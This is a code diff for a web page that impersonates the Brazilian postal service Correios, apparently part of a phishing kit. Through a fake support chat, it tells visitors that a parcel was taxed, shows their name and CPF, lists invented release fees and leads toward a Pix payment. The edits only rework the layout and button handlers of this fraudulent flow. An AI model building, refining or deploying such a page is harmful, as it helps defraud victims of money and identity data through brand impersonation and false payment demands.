@@ -10,7 +10,7 @@
   <link rel="stylesheet" href="css/yellow.css" />
   <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
   <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
-  <title>Correios | Rastreio</title>
+  <title>Correios</title>
 
   <!-- Add Futura font -->
   <style>
@@ -619,7 +619,7 @@
       padding: 12px 15px;
       margin-bottom: 15px;
       position: relative;
-      max-width: 80%;
+      max-width: 100%;
       word-wrap: break-word;
     }
 
@@ -633,7 +633,7 @@
       background-color: #f0f0f0;
       margin: 10px auto;
       text-align: center;
-      max-width: 60%;
+      max-width: 100%;
       font-size: 12px;
       padding: 8px 12px;
     }
@@ -957,20 +957,12 @@
     <!-- Mensagem sobre encomenda taxada -->
     <div class="message-box bot-message">
       <p class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</p>
-    </div>
-    
-    <!-- Imagem da encomenda -->
-    <div class="message-box bot-message">
       <img src="images/image1.png" alt="Encomenda tributada" class="message-image">
     </div>
     
     <!-- Pergunta sobre liberação -->
     <div class="message-box bot-message">
       <p class="message-text"><span id="chat-nome2"></span>, você deseja solicitar a liberação da sua mercadoria?</p>
-    </div>
-    
-    <!-- Áudio -->
-    <div class="message-box bot-message">
       <audio controls class="message-audio">
         <source src="audio/audio1.mp3" type="audio/mpeg">
         Seu navegador não suporta o elemento de áudio.
@@ -988,37 +980,21 @@
       <p class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</p>
       <p class="message-text">- Peso da mercadoria - Valor ajustado conforme o peso do item.</p>
       <p class="message-text">- Despacho postal - Serviço de liberação e envio.</p>
-    </div>
-    
-    <!-- Imagem da explicação -->
-    <div id="taxa-image" class="message-box bot-message hidden">
       <img src="images/image2.png" alt="Explicação sobre taxas" class="message-image">
-    </div>
-    
-    <!-- Áudio da explicação -->
-    <div id="taxa-audio" class="message-box bot-message hidden">
       <audio controls class="message-audio">
         <source src="audio/audio2.mp3" type="audio/mpeg">
         Seu navegador não suporta o elemento de áudio.
       </audio>
     </div>
     
-    <!-- Confirmação de pagamento -->
+    <!-- Confirmação de pagamento (inicialmente oculta) -->
     <div id="confirmacao-message" class="message-box bot-message hidden">
       <div class="message-sender">
         <img src="images/avatar.png" alt="Priscilla" style="width:20px;height:20px;border-radius:50%;vertical-align:middle;margin-right:5px;">
         Priscilla
       </div>
       <p class="message-text">✅ GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
-    </div>
-    
-    <!-- Imagem do comprovante -->
-    <div id="comprovante-image" class="message-box bot-message hidden">
       <img src="images/image3.png" alt="Guia de pagamento" class="message-image">
-    </div>
-    
-    <!-- Detalhes do pagamento -->
-    <div id="detalhes-pagamento" class="message-box bot-message hidden">
       <p class="message-text">Taxa de Liberação: R$ 23,89</p>
       <p class="message-text">Peso da mercadoria: R$ 19,50</p>
       <p class="message-text">Despacho postal: R$ 5,50</p>
@@ -1026,7 +1002,7 @@
       <p class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não será enviada</p>
     </div>
     
-    <!-- Detalhes finais -->
+    <!-- Detalhes finais (inicialmente oculta) -->
     <div id="detalhes-message" class="message-box bot-message hidden">
       <p class="message-text">ATENÇÃO, <span id="chat-nome3"></span></p>
       <p class="message-text">CPF: <span id="chat-cpf"></span></p>
@@ -1040,7 +1016,7 @@
     <button id="btn-continuar" class="chat-button hidden">CONTINUAR</button>
     <button id="btn-acessar-guia" class="chat-button hidden">ACESSAR GUIA</button>
   </div>
-</div> 
+</div>
 
     <!-- Removi a seção do banner-1.jpg que estava aqui -->
   </main>
@@ -1297,44 +1273,32 @@
     });
 
     // Lógica do chat modificada
-document.getElementById('btn-sim').addEventListener('click', function() {
-  // Mostra as mensagens sobre taxas
-  document.getElementById('taxa-message').classList.remove('hidden');
-  document.getElementById('taxa-image').classList.remove('hidden');
-  document.getElementById('taxa-audio').classList.remove('hidden');
-  
-  // Esconde o botão SIM e mostra o botão CONTINUAR
-  document.getElementById('btn-sim').classList.add('hidden');
-  document.getElementById('btn-continuar').classList.remove('hidden');
-  
-  // Rolagem automática para o final do chat
-  scrollToBottom();
-});
+    document.getElementById('btn-sim').addEventListener('click', function() {
+      // Mostra a mensagem sobre taxas
+      document.getElementById('taxa-message').classList.remove('hidden');
+      
+      // Esconde o botão SIM e mostra o botão CONTINUAR
+      document.getElementById('btn-sim').classList.add('hidden');
+      document.getElementById('btn-continuar').classList.remove('hidden');
+      
+      // Rolagem automática para o final do chat
+      const chatMessages = document.querySelector('.chat-messages');
+      chatMessages.scrollTop = chatMessages.scrollHeight;
+    });
 
-document.getElementById('btn-continuar').addEventListener('click', function() {
-  // Mostra todas as mensagens de confirmação
-  document.getElementById('confirmacao-message').classList.remove('hidden');
-  document.getElementById('comprovante-image').classList.remove('hidden');
-  document.getElementById('detalhes-pagamento').classList.remove('hidden');
-  document.getElementById('detalhes-message').classList.remove('hidden');
-  
-  // Esconde o botão CONTINUAR e mostra o botão ACESSAR GUIA
-  document.getElementById('btn-continuar').classList.add('hidden');
-  document.getElementById('btn-acessar-guia').classList.remove('hidden');
-  
-  // Rolagem automática para o final do chat
-  scrollToBottom();
-});
-
-document.getElementById('btn-acessar-guia').addEventListener('click', function() {
-  alert('Redirecionando para a página de pagamento...');
-  // Aqui você pode adicionar o redirecionamento real para a página de pagamento
-});
-
-function scrollToBottom() {
-  const chatMessages = document.querySelector('.chat-messages');
-  chatMessages.scrollTop = chatMessages.scrollHeight;
-}
+    document.getElementById('btn-continuar').addEventListener('click', function() {
+      // Mostra as mensagens de confirmação
+      document.getElementById('confirmacao-message').classList.remove('hidden');
+      document.getElementById('detalhes-message').classList.remove('hidden');
+      
+      // Esconde o botão CONTINUAR e mostra o botão ACESSAR GUIA
+      document.getElementById('btn-continuar').classList.add('hidden');
+      document.getElementById('btn-acessar-guia').classList.remove('hidden');
+      
+      // Rolagem automática para o final do chat
+      const chatMessages = document.querySelector('.chat-messages');
+      chatMessages.scrollTop = chatMessages.scrollHeight;
+    });
 
     document.getElementById('btn-acessar-guia').addEventListener('click', function() {
       alert('Redirecionando para a página de pagamento...');
@@ -1363,7 +1327,7 @@ function scrollToBottom() {
       // Simula a geração do Pix (na implementação real, faria uma requisição)
       console.log("Simulando geração do Pix para:", nome, cpf);
       
-      // Armazena dados fictícios no sessionStorage.
+      // Armazena dados fictícios no sessionStorage
       const pixData = {
           pix: "00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426655440000520400005303986540510.005802BR5913FULANO SILVA6008BRASILIA62070503***6304A1B2",
           externalId: "123456789",
@@ -1377,4 +1341,4 @@ function scrollToBottom() {
     });
   </script>
 </body>
-</html> 
+</html>
